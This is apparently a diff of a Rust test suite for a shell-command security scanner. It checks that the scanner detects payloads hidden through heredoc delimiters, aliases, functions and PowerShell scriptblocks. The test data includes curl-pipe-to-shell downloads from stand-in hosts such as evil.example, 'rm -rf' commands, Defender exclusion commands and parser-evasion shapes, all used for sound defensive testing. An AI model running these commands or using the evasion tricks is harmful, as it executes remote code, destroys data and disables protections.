+        // zsh removes more backslashes than bash and dash: before `!` in an
+        // interactive zsh (history expansion is on by default) and inside
+        // `${...}`, `$[...]`, `$((...))` and `$(...)`, where each shell has
+        // its own rules. The terminator depends on the shell, so the heredoc
+        // fails closed whichever of the two lines comes first.
+        for (delimiter, zsh_line, bash_line) in [
+            (r#""E\!""#, "E!", r"E\!"),
+            (r#""E\! F""#, "E! F", r"E\! F"),
+            (r#""${a\}b}""#, "${a}b}", r"${a\}b}"),
+            (r#""${a:-\}}""#, "${a:-}}", r"${a:-\}}"),
+            (r#""$[E\]F]""#, "$[E]F]", r"$[E\]F]"),
+            (r#""$[a\}]""#, "$[a}]", r"$[a\}]"),
+            (r#""$((a\)b))""#, "$((a)b))", r"$((a\)b))"),
+            (r#""$(a\\b)""#, r"$(a\\b)", r"$(a\b)"),
+            (r#""$(a\$b)""#, r"$(a\$b)", "$(a$b)"),
+            (r#""$[a\"b]""#, r#"$[a\"b]"#, r#"$[a"b]"#),
+            ("\"`a\\!b`\"", "`a!b`", "`a\\!b`"),
+        ] {
+            for (first, second) in [(zsh_line, bash_line), (bash_line, zsh_line)] {
+                let input = format!("cat <<{delimiter}\nbody\n{first}\n{payload}\n{second}\n");
+                assert_eq!(posix_heredoc_spans(&input), None, "{input:?}");
+                let scan = executable_substitution_scan(&input, ShellType::Posix);
+                assert!(scan.gap.is_some(), "{input:?} -> {scan:?}");
+                let view = shell_execution_view(&input, ShellType::Posix);
+                assert!(view.contains(payload), "{input:?} -> {view:?}");
+            }
+        }
+        // Unquoted, an interactive zsh's history expansion consumes the
+        // backslash before `!`, so `<<E\!F` is an UNQUOTED heredoc there and
+        // its body's substitutions run; bash and dash read a quoted one.
+        for delimiter in [r"E\!F", r"\!EOF"] {
+            let terminator = delimiter.replace('\\', "");
+            let input = format!("cat <<{delimiter}\nx $({payload})\n{terminator}\n");
+            assert_eq!(posix_heredoc_spans(&input), None, "{input:?}");
+            let scan = executable_substitution_scan(&input, ShellType::Posix);
+            assert!(scan.gap.is_some(), "{input:?} -> {scan:?}");
+        }
+        // Inside single quotes `\!` is literal in every shell.
+        let literal = format!("cat <<'E\\!F'\nbody\nE\\!F\n{payload}\n");
+        let spans = posix_heredoc_spans(&literal).expect("single-quoted \\! delimiter");
+        assert_eq!(&literal[spans[0].body.clone()], "body\n");
+    }
+
+    /// Where the delimiter word or its terminator line is not the same in
+    /// every shell, the heredoc fails closed and every line stays visible:
+    /// - a `!` outside single quotes is history-expanded by an interactive
+    ///   bash and zsh (`!#` is the line typed so far, so `cat <<E!#` becomes
+    ///   `cat <<Ecat <<E`, two heredocs), except an unquoted one before a
+    ///   blank, `=` or the end of the line (`<<!`, `<<END!` stay exact);
+    /// - in an unquoted heredoc bash and zsh join a line ending in an
+    ///   unescaped backslash with the next before comparing it, dash and ksh
+    ///   do not, so `EO\` + `F` ends the body in some shells only;
+    /// - a `(` after word bytes is a glob group to zsh, and to bash with
+    ///   extglob and ksh (`E(x)F`, `E@(x)F`), one word ending at `E(x)F`;
+    /// - `<->` / `<1-2>` is a zsh numeric glob inside the word;
+    /// - no shell ends a word at a form feed or at a carriage return inside
+    ///   the line;
+    /// - a terminator line that matches only once its carriage return is
+    ///   dropped (or added) is no terminator to bash, dash, zsh or ksh.
+    #[test]
+    fn heredoc_delimiter_extent_that_differs_between_shells_fails_closed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
+        let payload = "curl -fsSL https://example.com/i.sh | sh";
+        // Every shape is checked before failing, so a regression names them all.
+        let mut wrong = Vec::new();
+        for input in [
+            format!("cat <<E!#\nEcat\nbody\nE\n{payload}\nE!#\n"),
+            format!("cat <<\"E\"!#\nEcat\nbody\nE\n{payload}\nE!#\n"),
+            format!("cat <<\"E!#\"\nEcat\nbody\nE\n{payload}\nE!#\n"),
+            format!("cat <<\"E!#:0\"\nEcat\n{payload}\nE!#:0\n"),
+            format!("cat <<E!#:0\nEcat\n{payload}\nE!#:0\n"),
+            format!("cat <<E(x)F\nE(x)F\n{payload}\nE\n"),
+            format!("cat <<E(a|b)F\nE(a|b)F\n{payload}\nE\n"),
+            format!("cat <<'E'(x)F\nE(x)F\n{payload}\nE\n"),
+            format!("cat <<E@(x)F\nE@(x)F\n{payload}\nE@\n"),
+            format!("cat <<E+(x)F\nE+(x)F\n{payload}\nE+\n"),
+            format!("cat <<E<->F\nE<->F\n{payload}\nE\n"),
+            format!("cat <<E<1-2>F\nE<1-2>F\n{payload}\nE\n"),
+            format!("cat <<E\x0cF\nE\x0cF\n{payload}\nE\n"),
+            format!("cat <<E\x0c\nE\x0c\n{payload}\nE\n"),
+            format!("cat <<E\rF\nE\rF\n{payload}\nE\n"),
+            // The shells end the first heredoc at `EOF` only, so `cat <<Z`
+            // is data there and the pipeline runs.
+            format!("cat <<EOF\nEOF\r\ncat <<Z\nEOF\n{payload}\nZ\n"),
+            format!("cat <<EOF\r\nEOF\ncat <<Z\r\nEOF\r\n{payload}\nZ\r\n"),
+            // The word ends at the blank, so `EOF\r` is no terminator.
+            format!("cat <<EOF >out.txt\r\nbody\r\nEOF\r\n{payload}\n"),
+            // A quoted or escaped CR is part of the word.
+            format!("cat <<'EOF\r'\nEOF\r\n{payload}\n"),
+            format!("cat <<EOF\\\r\nEOF\r\n{payload}\n"),
+            // An interactive bash or zsh history-expands a `!` before any
+            // other byte, and an interactive zsh reads `<<"!"` to the end.
+            format!("cat <<E!x\nbody\nE!x\n{payload}\n"),
+            format!("cat <<!E\nbody\n!E\n{payload}\n"),
+            format!("cat <<E!|cat\nbody\nE!\n{payload}\n"),
+            format!("cat <<E!;\nbody\nE!\n{payload}\n"),
+            format!("cat <<\"!\"\nbody\n!\n{payload}\n"),
+            format!("cat <<\"END!\"\nbody\nEND!\n{payload}\n"),
+            format!("cat <<E!\r\nbody\r\nE!\r\n{payload}\r\n"),
+            // In an unquoted heredoc bash and zsh join a line ending in a
+            // backslash with the next before comparing it, so `EO\` + `F`
+            // ends the body and the pipeline runs there; dash and ksh compare
+            // only lines that are not continued and read it as data.
+            format!("cat <<EOF\nbody\nEO\\\nF\n{payload}\nEOF\n"),
+            format!("cat <<-EOF\nbody\n\tEO\\\nF\n{payload}\nEOF\n"),
+            format!("cat <<EOF\nE\\\nO\\\nF\n{payload}\nEOF\n"),
+            format!("cat <<EOF\nEOF\\\n\n{payload}\nEOF\n"),
+            // dash drops a backslash-newline at the start of a line before it
+            // compares the rest, so it ends `\` + `EOF` too (ksh does not);
+            // with `<<-`, `\` + tab `EOF` ends in bash and dash but not zsh,
+            // and tab `\` + `EOF` in bash and zsh but not dash.
+            format!("cat <<EOF\nbody\n\\\nEOF\n{payload}\nEOF\n"),
+            format!("cat <<-EOF\nbody\n\\\n\tEOF\n{payload}\nEOF\n"),
+            format!("cat <<-EOF\nbody\n\t\\\nEOF\n{payload}\nEOF\n"),
+        ] {
+            let scan = executable_substitution_scan(&input, ShellType::Posix);
+            let view = shell_execution_view(&input, ShellType::Posix);
+            if posix_heredoc_spans(&input).is_some()
+                || scan.gap.is_none()
+                || !view.contains(payload)
+            {
+                wrong.push(input);
+            }
+        }
+        assert!(wrong.is_empty(), "boundary read one way only: {wrong:#?}");
+
+        // No shell compares the line after a continued one on its own, so
+        // `foo\` + `EOF` is data everywhere and the body ends at the next
+        // `EOF`. Ending it there let the data line `cat <<X` open a heredoc
+        // that hid the pipeline every shell runs.
+        for input in [
+            format!("cat <<EOF\nfoo\\\nEOF\ncat <<X\nEOF\n{payload}\nX\n"),
+            // Three backslashes: an escaped one, then a continuation.
+            format!("cat <<EOF\nfoo\\\\\\\nEOF\ncat <<X\nEOF\n{payload}\nX\n"),
+        ] {
+            let spans = posix_heredoc_spans(&input).unwrap_or_else(|| panic!("{input:?}"));
+            if spans.len() != 1 || !input[spans[0].body.clone()].ends_with("EOF\ncat <<X\n") {
+                wrong.push(input.clone());
+            }
+            if !shell_execution_view(&input, ShellType::Posix).contains(payload) {
+                wrong.push(input);
+            }
+        }
+        assert!(
+            wrong.is_empty(),
+            "line after a continued one ended the body: {wrong:#?}"
+        );
+
+        // Spellings every shell reads alike keep their exact boundaries.
+        for (input, body) in [
+            // Single quotes stop history expansion and globbing.
+            ("cat <<'E!F'\nbody\nE!F\n", "body\n"),
+            ("cat <<'E(x)F'\nbody\nE(x)F\n", "body\n"),
+            ("cat <<'E<->F'\nbody\nE<->F\n", "body\n"),
+            // `)` still ends the word, and a `<` that starts no numeric glob
+            // is a redirection.
+            ("(cat <<EOF)\nbody\nEOF\n", "body\n"),
+            ("cat <<EOF<input.txt\nbody\nEOF\n", "body\n"),
+            ("cat <<EOF;echo done\nbody\nEOF\n", "body\n"),
+            // CRLF lines: the word and the terminator both end in `\r`.
+            ("cat <<EOF\r\nbody\r\nEOF\r\n", "body\r\n"),
+            ("cat <<'EOF'\r\nbody\r\nEOF\r\n", "body\r\n"),
+            ("cat <<-EOF\r\n\tbody\r\n\tEOF\r\n", "\tbody\r\n"),
+            // Neither shell history-expands an unquoted `!` before a blank,
+            // `=` or the end of the line: the classic `<<!` idiom.
+            ("cat <<!\nbody\n!\n", "body\n"),
+            ("cat <<END!\nbody\nEND!\necho done\n", "body\n"),
+            ("cat <<END! | cat\nbody\nEND!\n", "body\n"),
+            ("cat <<END!\t>out.txt\nbody\nEND!\n", "body\n"),
+            ("cat <<E!=x\nbody\nE!=x\n", "body\n"),
+            ("cat <<E\"x\"!\nbody\nEx!\n", "body\n"),
+            ("cat <<'!'\nbody\n!\n", "body\n"),
+            // A continued line that joins into no terminator, a quoted
+            // heredoc (no joining), an escaped backslash and a backslash
+            // before a CR end the body at the same line in every shell.
+            ("cat <<EOF\na\\\nb\nEOF\n", "a\\\nb\n"),
+            ("cat <<'EOF'\nEO\\\nF\nEOF\n", "EO\\\nF\n"),
+            ("cat <<EOF\nEO\\\\\nF\nEOF\n", "EO\\\\\nF\n"),
+            ("cat <<EOF\nfoo\\\\\nEOF\n", "foo\\\\\n"),
+            ("cat <<EOF\r\nEO\\\r\nF\r\nEOF\r\n", "EO\\\r\nF\r\n"),
+            // `<<-` strips the tabs before the joined line, not inside it.
+            ("cat <<-EOF\nEO\\\n\tF\nEOF\n", "EO\\\n\tF\n"),
+            ("cat <<-EOF\n\tE\\\n\t\tOF\nEOF\n", "\tE\\\n\t\tOF\n"),
+        ] {
+            let spans = posix_heredoc_spans(input).unwrap_or_else(|| panic!("{input:?}"));
+            assert_eq!(spans.len(), 1, "{input:?}");
+            assert_eq!(&input[spans[0].body.clone()], body, "{input:?}");
+        }
+    }
+
     #[test]
     fn secondary_command_consumers_recover_their_literal_child() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (input, shell, child_shell, expected) in [
             (
                 "printf x | xargs rm -rf /",
@@ -14834,6 +18659,7 @@ mod tests {
 
     #[test]
     fn find_action_spellings_used_as_predicate_operands_are_not_executed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "find . -name -exec -print",
             "find . -path -execdir -print",
@@ -14848,6 +18674,7 @@ mod tests {
 
     #[test]
     fn dynamic_secondary_command_consumers_fail_closed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (input, shell) in [
             ("xargs -I{} {} -rf /", ShellType::Posix),
             ("find . -exec $COMMAND {} \\;", ShellType::Posix),
@@ -14864,6 +18691,7 @@ mod tests {
 
     #[test]
     fn powershell_functions_and_switch_actions_are_executable_bodies() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "function Evil { Add-MpPreference -ExclusionPath C:\\Temp }; Evil",
             "filter Evil { Add-MpPreference -ExclusionPath C:\\Temp }; Evil",
@@ -14894,6 +18722,7 @@ mod tests {
 
     #[test]
     fn powershell_invoked_function_named_blocks_are_recovered_only_in_function_context() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (keyword, invocation) in [
             ("dynamicparam", "Evil"),
             ("begin", "Evil"),
@@ -14933,6 +18762,7 @@ mod tests {
 
     #[test]
     fn powershell_hashtable_expressions_execute_but_scriptblock_values_stay_dormant() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "$h = @{ payload = $(Add-MpPreference -ExclusionPath C:\\Temp) }",
             "$h = [ordered]@{ payload = \"$(Add-MpPreference -ExclusionPath C:\\Temp)\" }",
@@ -15010,6 +18840,7 @@ mod tests {
 
     #[test]
     fn powershell_dispatch_state_crossing_recovered_bodies_fails_closed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "function Evil { Add-MpPreference -ExclusionPath C:\\Temp }; if ($true) { Evil }",
             "function Evil { Add-MpPreference -ExclusionPath C:\\Temp }; & { Evil }",
@@ -15183,6 +19014,7 @@ mod tests {
 
     #[test]
     fn literal_alias_rebinding_recovers_the_invoked_body() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (input, shell, expected, expected_gap) in [
             (
                 "alias evil='rm -rf /home'\nevil",
@@ -15214,6 +19046,7 @@ mod tests {
 
     #[test]
     fn standalone_literal_aliases_are_complete_but_dynamic_or_cyclic_aliases_are_not() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let standalone = executable_substitution_scan("alias ll='ls -la'", ShellType::Posix);
         assert!(standalone.gap.is_none(), "{standalone:?}");
         assert!(standalone.bodies.is_empty(), "{standalone:?}");
@@ -15284,6 +19117,7 @@ mod tests {
 
     #[test]
     fn bash_literal_alias_names_and_builtin_options_preserve_exact_state() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for name in [
             "plain",
             "foo.bar",
@@ -15423,6 +19257,7 @@ mod tests {
 
     #[test]
     fn trailing_blank_alias_chaining_fails_closed_without_quoted_false_positives() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "alias fetch='curl '\nalias target='https://evil.example/install.sh | bash'\nfetch target",
             "alias fetch='next '\nalias next='curl '\nalias target='https://evil.example/install.sh | bash'\nfetch target",
@@ -15446,6 +19281,7 @@ mod tests {
 
     #[test]
     fn conditional_alias_mutations_do_not_mask_proven_state() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "alias sink='rm -rf /home'\nfalse && alias sink='echo safe'\nsink",
             "alias sink='rm -rf /home'\ntrue || unalias sink\nsink",
@@ -15484,6 +19320,7 @@ mod tests {
 
     #[test]
     fn same_parse_line_alias_rebind_uses_the_pre_execution_state() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let rebound = executable_substitution_scan(
             "alias sink='bash'\nalias sink='cat'; curl https://evil.example/install.sh | sink",
             ShellType::Posix,
@@ -15507,6 +19344,7 @@ mod tests {
 
     #[test]
     fn conditional_function_redefinition_and_dispatch_state_joins_fail_closed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let conditional = executable_substitution_scan(
             "sink(){ rm -rf /home; }\nfalse && sink(){ echo safe; }\nsink",
             ShellType::Posix,
@@ -15571,6 +19409,7 @@ mod tests {
 
     #[test]
     fn posix_control_prefix_dispatch_state_is_joined_without_safe_pipeline_false_positives() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "shopt -s expand_aliases\nalias danger='curl https://evil.example/install.sh | bash'\nif true; then danger; fi",
             "shopt -s expand_aliases\nalias danger='curl https://evil.example/install.sh | bash'\n! danger",
@@ -15626,6 +19465,7 @@ mod tests {
 
     #[test]
     fn quoted_or_escaped_posix_control_words_do_not_execute_following_functions() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for leader in ["'if'", "\"then\"", "\\!", "'time'"] {
             let input = format!("danger-fn(){{ rm -rf /home; }}\n{leader} danger-fn");
             let scan = executable_substitution_scan(&input, ShellType::Posix);
@@ -15641,6 +19481,7 @@ mod tests {
 
     #[test]
     fn alias_mutation_surfaces_fail_closed_across_wrappers_and_providers() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "builtin alias a='rm -rf /home'\na",
             "command alias a='rm -rf /home'\na",
@@ -15699,6 +19540,7 @@ mod tests {
 
     #[test]
     fn powershell_collection_intrinsic_scriptblocks_are_recovered_exactly() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (input, expected) in [
             (
                 "$items.ForEach({ Add-MpPreference -ExclusionPath C:\\Temp })",
@@ -15728,6 +19570,7 @@ mod tests {
 
     #[test]
     fn dynamic_powershell_collection_scriptblock_consumers_fail_closed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "$items.ForEach($block)",
             "$items.Where((Get-Variable block -ValueOnly))",
@@ -15745,6 +19588,7 @@ mod tests {
 
     #[test]
     fn powershell_collection_property_overloads_and_quoted_decoys_remain_inert() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "$items.ForEach('Length')",
             "$items.ForEach(\"Length\")",
@@ -15772,6 +19616,7 @@ mod tests {
 
     #[test]
     fn powershell_no_space_iex_recovers_literals_and_gaps_dynamic_values() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (input, expected) in [
             (
                 "iex('Set-ExecutionPolicy Bypass')",
@@ -15818,6 +19663,7 @@ mod tests {
 
     #[test]
     fn dynamic_powershell_scriptblock_consumers_fail_closed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "$block = { Add-MpPreference -ExclusionPath C:\\Temp }; $block.Invoke()",
             "$block.InvokeWithContext($null, @(), @())",
@@ -15839,6 +19685,7 @@ mod tests {
 
     #[test]
     fn powershell_scriptblock_invoke_methods_accept_unicode_whitespace() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "{ Add-MpPreference -ExclusionPath C:\\Temp }\u{00a0}.Invoke\u{2003}()",
             "{ Add-MpPreference -ExclusionPath C:\\Temp }\u{202f}.InvokeReturnAsIs\u{205f}()",
@@ -15869,6 +19716,7 @@ mod tests {
 
     #[test]
     fn powershell_parameter_prefixes_bind_scriptblocks_and_scopes() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let scope = |command: &str, args: &[&str]| {
             powershell_scriptblock_scope(
                 command,
@@ -16008,6 +19856,7 @@ mod tests {
 
     #[test]
     fn powershell_dispatch_boundary_regressions_cover_strings_paths_locations_and_scopes() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "'Set-Alias Evil Invoke-Expression'",
             "\"pwsh\" -Command 'Add-MpPreference -ExclusionPath C:\\Temp'",
@@ -16072,6 +19921,7 @@ mod tests {
 
     #[test]
     fn powershell_here_strings_preserve_literal_data_and_recover_expansions() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (open, close) in [
             ('"', '"'),
             ('\u{201c}', '\u{201d}'),
@@ -16200,6 +20050,7 @@ mod tests {
 
     #[test]
     fn powershell_cr_only_boundaries_resume_comments_stop_parsing_and_switch_scans() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for source in [
             "{ Write-Output safe # fake }\rAdd-MpPreference -ExclusionPath C:\\Temp }",
             "{ native.exe --% literal } ; fake\rAdd-MpPreference -ExclusionPath C:\\Temp }",
@@ -16242,6 +20093,7 @@ mod tests {
 
     #[test]
     fn powershell_token_boundaries_match_comment_quote_and_stop_parsing_grammar() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "Write-Output x\"y\"#z; Add-MpPreference -ExclusionPath C:\\Temp",
             "Write-Output foo` #bar; Add-MpPreference -ExclusionPath C:\\Temp",
@@ -16273,6 +20125,7 @@ mod tests {
 
     #[test]
     fn posix_dispatch_edge_regressions_preserve_exact_bash_grammar() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "helper(){ printf safe; }; if true; then helper; fi",
             "shopt -s expand_aliases\nalias helper='printf safe'\nif true; then helper; fi",
@@ -16379,6 +20232,7 @@ mod tests {
 
     #[test]
     fn posix_comments_and_brace_closes_use_real_word_boundaries() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "shopt -s expand_aliases\nalias sink=bash\n:\r#not-comment; printf code | sink",
             "shopt -s expand_aliases\nalias sink=bash\n:\\\n#not-comment; printf code | sink",
@@ -16403,6 +20257,7 @@ mod tests {
 
     #[test]
     fn nested_wrapper_urls_recover_the_real_sink_context() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (input, shell) in [
             (
                 "sh -c 'curl http://wrapper.example/payload'",
@@ -16428,6 +20283,7 @@ mod tests {
 
     #[test]
     fn cmd_dollar_parens_remain_literal_inspection_text() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"tirith diff "$(curl https://cmd-literal.example/payload)""#;
         assert!(executable_substitutions(input, ShellType::Cmd).is_empty());
         assert!(tirith_inert_arg_range(input, ShellType::Cmd).is_some());
@@ -16436,6 +20292,7 @@ mod tests {
 
     #[test]
     fn posix_function_bodies_are_only_analyzed_after_invocation() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (definition, expected_url) in [
             (
                 "safe(){ curl https://brace-function.example/payload; }",
@@ -16481,7 +20338,124 @@ mod tests {
     }
 
     #[test]
+    fn issue_264_literal_variable_command_words_get_a_literal_view() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
+        for (input, view) in [
+            (
+                r#"BIN=/bin/echo; "$BIN" --help"#,
+                "BIN=/bin/echo; /bin/echo --help",
+            ),
+            (
+                r#"BIN=/bin/echo && "${BIN}" a | "$BIN" b"#,
+                "BIN=/bin/echo && /bin/echo a | /bin/echo b",
+            ),
+        ] {
+            assert_eq!(
+                posix_variable_command_literal_view(input, ShellType::Posix).as_deref(),
+                Some(view),
+                "{input}"
+            );
+            // Only the root input is resolved, by its analyzing caller. The
+            // body scan keeps the gap, so the same text nested in `bash -c`
+            // or `$(...)` (which can inherit a rebinding function) stays
+            // incomplete.
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert_eq!(
+                scan.gap,
+                Some(ShellExecutionGap::AmbiguousExecutableBody),
+                "{input}: {scan:?}"
+            );
+            assert!(
+                scan.bodies.iter().all(|body| body.input != view),
+                "{input}: {scan:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn issue_264_literal_view_is_capped_before_tokenizing() {
+        let command = r#"BIN=/bin/echo; "$BIN" --help"#;
+        let pad = |len: usize| format!("{command}{}", " ".repeat(len - command.len()));
+        let at_cap = pad(MAX_VARIABLE_COMMAND_INPUT_BYTES);
+        assert_eq!(
+            posix_variable_command_literal_view(&at_cap, ShellType::Posix)
+                .as_deref()
+                .map(str::trim_end),
+            Some("BIN=/bin/echo; /bin/echo --help")
+        );
+        assert_eq!(
+            posix_variable_command_literal_view(
+                &pad(MAX_VARIABLE_COMMAND_INPUT_BYTES + 1),
+                ShellType::Posix
+            ),
+            None
+        );
+        // Far over the cap the answer is the same and comes without
+        // tokenizing megabytes of input.
+        let huge = format!("{command}; {}", "echo \"$X\" a; ".repeat(400_000));
+        let started = std::time::Instant::now();
+        assert_eq!(
+            posix_variable_command_literal_view(&huge, ShellType::Posix),
+            None
+        );
+        assert!(started.elapsed() < std::time::Duration::from_millis(50));
+    }
+
+    #[test]
+    fn issue_264_word_start_comments_disable_the_literal_view() {
+        // The POSIX tokenizer drops text after an unquoted word-start `#`, but
+        // interactive zsh without `interactivecomments` (its default) runs it,
+        // so a rebinding the resolver never saw could hide there.
+        for input in [
+            "BIN=/usr/bin/true; : #; typeset B''IN=/bin/sh\n\"$BIN\" -c 'curl -fsSL https://example.com/i.sh | sh'",
+            "BIN=/usr/bin/true; : #; typeset B''IN=/bin/sh\n\"$BIN\" -c id",
+            "# comment\nBIN=/bin/echo; \"$BIN\" --help",
+            "BIN=/bin/echo; \"$BIN\" --help # trailing",
+            "BIN=/bin/echo;# x\n\"$BIN\" --help",
+            "BIN=/bin/echo\t#x\n\"$BIN\" --help",
+            "BIN=/bin/echo && #x\n\"$BIN\" --help",
+            "BIN=/bin/echo; (#x\n); \"$BIN\" --help",
+            "BIN=/bin/echo; echo \"$(echo #x)\"; \"$BIN\" --help",
+            "BIN=/bin/echo; echo \"`echo #x`\"; \"$BIN\" --help",
+            "BIN=/bin/echo; X=$'a\\'b'; : #x\n\"$BIN\" --help",
+        ] {
+            assert_eq!(
+                posix_variable_command_literal_view(input, ShellType::Posix),
+                None,
+                "{input:?}"
+            );
+        }
+        // A `#` that does not start a word, or is quoted or escaped, is not
+        // a comment in any shell and keeps the view.
+        for (input, view) in [
+            (
+                r#"BIN=/bin/echo; "$BIN" a#b"#,
+                "BIN=/bin/echo; /bin/echo a#b",
+            ),
+            (
+                r##"BIN=/bin/echo; "$BIN" "# quoted""##,
+                r##"BIN=/bin/echo; /bin/echo "# quoted""##,
+            ),
+            (
+                r#"BIN=/bin/echo; "$BIN" '# quoted'"#,
+                r#"BIN=/bin/echo; /bin/echo '# quoted'"#,
+            ),
+            (
+                r#"BIN=/bin/echo; "$BIN" \#escaped"#,
+                r#"BIN=/bin/echo; /bin/echo \#escaped"#,
+            ),
+        ] {
+            assert_eq!(
+                posix_variable_command_literal_view(input, ShellType::Posix).as_deref(),
+                Some(view),
+                "{input:?}"
+            );
+        }
+    }
+
+    #[test]
     fn issue_260_bracket_test_conditions_keep_static_command_identity() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             r#"if [ -n "$X" ]; then echo yes; fi"#,
             r#"while [ -n "$X" ]; do echo y; done"#,
@@ -16505,6 +20479,7 @@ mod tests {
 
     #[test]
     fn issue_260_arithmetic_recovers_substitutions_in_data_position() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "echo $(( $(date +%s) - 100 ))",
             r#"echo "$(( $(date +%s) - 100 ))""#,
@@ -16538,6 +20513,7 @@ mod tests {
 
     #[test]
     fn issue_260_unknown_arithmetic_values_keep_their_execution_gap() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "echo $(( $PAYLOAD - 100 ))",
             "echo $(( ${PAYLOAD} - 100 ))",
@@ -16560,6 +20536,7 @@ mod tests {
 
     #[test]
     fn issue_264_quoted_function_headers_do_not_mutate_shell_dispatch() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "echo hi | python3 -c 'import sys; print(sys.stdin.read())'",
             "printf '%s' 'f(){ rm -rf /; }' | cat",
@@ -16591,6 +20568,7 @@ mod tests {
 
     #[test]
     fn issue_264_quoted_data_keeps_live_command_substitutions() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"true && echo "f(){ data; } $(curl https://evil.example/payload | bash)""#;
         let findings =
             crate::rules::command::check(input, ShellType::Posix, None, ScanContext::Exec);
@@ -16604,6 +20582,7 @@ mod tests {
 
     #[test]
     fn a_plain_unset_of_a_variable_keeps_the_walk_resolved() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // `unset NAME` used to fail the POSIX function-state walk outright,
         // which the engine reports as `analysis_incomplete` and a Block. The
         // builtin is static and the repository's own shell hooks run it, so a
@@ -16623,6 +20602,7 @@ mod tests {
 
     #[test]
     fn an_unset_that_can_reach_a_tracked_function_still_fails_closed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // The conservative half: once a function of that name is tracked in the
         // same buffer, `unset name` really is ambiguous (Bash selects the
         // variable first, and ambient variable state is outside this buffer),
@@ -16643,6 +20623,7 @@ mod tests {
 
     #[test]
     fn issue_264_unquoted_backtick_function_name_keeps_exact_producer_origin() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = "function `curl https://evil.example/name | bash` { :; }; echo $(curl https://evil.example/sibling | bash)";
         let scan = executable_substitution_scan(input, ShellType::Posix);
         assert_eq!(
@@ -16666,6 +20647,7 @@ mod tests {
 
     #[test]
     fn bash_extended_literal_function_names_are_recovered_or_fail_closed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (definition, invocation) in [
             ("sink-fn(){ bash; }", "sink-fn"),
             ("function sink.fn { bash; }", "sink.fn"),
@@ -16711,6 +20693,7 @@ mod tests {
 
     #[test]
     fn incomplete_active_construct_keeps_its_recoverable_suffix_analyzable() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = "tirith diff $(curl https://incomplete.example/payload";
         let bodies = executable_substitutions(input, ShellType::Posix);
         assert_eq!(bodies.len(), 1, "{bodies:?}");
@@ -16722,6 +20705,7 @@ mod tests {
 
     #[test]
     fn scp_remote_path_with_embedded_scheme_keeps_the_transport_host() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let raw = "git@evil.example://github.com/org/repo.git";
         let spec = parse_scp_remote_spec(raw, ShellType::Posix).unwrap();
         assert_eq!(spec.host, "evil.example");
@@ -16818,5 +20802,184 @@ mod dispatch_scan_budget_tests {
         let (_, gap) =
             lexical_executable_substitutions("f() { alias ls=rm; }; f", ShellType::Posix);
         assert_eq!(gap, Some(ShellExecutionGap::AmbiguousExecutableBody));
+    }
+}
+
+#[cfg(test)]
+mod curl_glob_tests {
+    use super::*;
+
+    /// curl's URL glob grammar as curl 8.7.1 expands it: ranges with padding
+    /// and a step, sets (an empty element included), escaped brackets and
+    /// bracketed IPv6 addresses as text, and globs after the host left alone.
+    #[test]
+    fn curl_host_glob_expands_the_host_part_as_curl_does() {
+        let expanded = |raw: &str| match curl_host_glob(raw, false) {
+            CurlHostGlob::Expanded(values) => values,
+            other => panic!("{raw}: {other:?}"),
+        };
+        assert_eq!(
+            expanded("http://127.0.0.[1-5:2]:9/x[1-3]"),
+            [
+                "http://127.0.0.1:9/x[1-3]",
+                "http://127.0.0.3:9/x[1-3]",
